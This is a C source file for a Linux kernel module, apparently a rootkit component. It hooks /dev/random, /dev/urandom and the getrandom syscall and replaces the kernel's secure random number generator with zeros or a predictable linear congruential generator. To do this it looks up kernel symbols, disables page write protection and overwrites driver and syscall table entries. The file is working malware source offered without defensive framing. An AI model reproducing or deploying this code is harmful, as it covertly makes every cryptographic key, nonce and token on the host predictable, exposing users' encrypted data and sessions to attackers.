#include "csprng.h"

#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

#include "helper.h"
#include "syscall_hooking.h"

/*
 * For debugging purpose, return always zeros as random value, otherwise use the predictable PRNG below
 */
#define ZERO 1

/*
 * Replace the Linux Cryptographic Secure Pseudo Random Number Generator
 * by a predictable one
 *
 * From random(7) we know:
 * - The kernel RNG relies on entropy gathered from device drivers to seed a CSPRNG
 * - Interfaces are /dev/random, /dev/urandom, getrandom syscall, which must all be hooked
*/

static struct file_operations *urandom_fops = NULL;
static struct file_operations *random_fops = NULL;

typedef ssize_t (*fops_read_t) (struct file *, char __user *, size_t, loff_t *);
static fops_read_t orig_urandom_read = NULL;
static fops_read_t orig_random_read = NULL;

/*
 * Linear Congruential Generator
 * seed = (random = seed * a + c (mod m))
 *
 * Microsoft formula: a = 214013, c = 2531011, m = 2^31
 */

#define RAND_A 214013
#define RAND_C 2531011
#define RAND_MOD ((1U << 31) - 1)
static unsigned int seed = 0;

static size_t predictable_prng(char __user *buf, size_t count) {

    char *kbuf;
    int i;

    if (ZERO || NULL == (kbuf = kmalloc(count, GFP_KERNEL))) {
        return count - clear_user(buf, count);
    }

    for (i = 0; i < count; i++) {
        seed = (seed * RAND_A + RAND_C) & RAND_MOD;
        kbuf[i] = (unsigned char) seed;
    }

    if (0 != copy_to_user(buf, kbuf, count)) {
        kfree(kbuf);
        return count - clear_user(buf, count);
    }

    kfree(kbuf);
    return count;
}

/*
 * Hooked read function for /dev/urandom and /dev/random, calls the predictable PRNG instead
 */
static ssize_t hooked_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
    return predictable_prng(buf, count);
}

/*
 * Hooked getrandom syscall, calls the predictable PRNG instead
 */
static asmlinkage long hooked_getrandom(const struct pt_regs *pt_regs) {

    char __user *buf;
    size_t count;

    // get buf from user
    buf = (char __user *) pt_regs->di;
    count = (size_t) pt_regs->si;

    return predictable_prng(buf, count);
}

int enable_csprng_hook(void) {

    unsigned long i;

    if (orig_random_read != NULL) {
        // already enabled
        return -1;
    }

    /*
     * Get /dev/urandom file operations
     */
    if (0 == (i = kallsyms_lookup_name("urandom_fops"))) {
        return -1;
    }
    urandom_fops = (struct file_operations *) i;
    orig_urandom_read = urandom_fops->read;

    /*
     * Get /dev/random file operations
     */
    if (0 == (i = kallsyms_lookup_name("random_fops"))) {
        return -1;
    }
    random_fops = (struct file_operations *) i;
    orig_random_read = random_fops->read;

    /*
     * Hook /dev/random, /dev/urandom and getrandom()
     */
    unprotect_paging_mode();
    urandom_fops->read = hooked_read;
    random_fops->read = hooked_read;
    add_syscall_hook(__NR_getrandom, (unsigned long *) hooked_getrandom);
    protect_paging_mode();

    return 0;
}

void disable_csprng_hook(void) {

    if (orig_random_read == NULL) {
        // not enabled
        return;
    }

    // restore fops and syscall
    unprotect_paging_mode();
    urandom_fops->read = orig_urandom_read;
    random_fops->read = orig_random_read;
    rm_syscall_hook(__NR_getrandom);
    protect_paging_mode();
}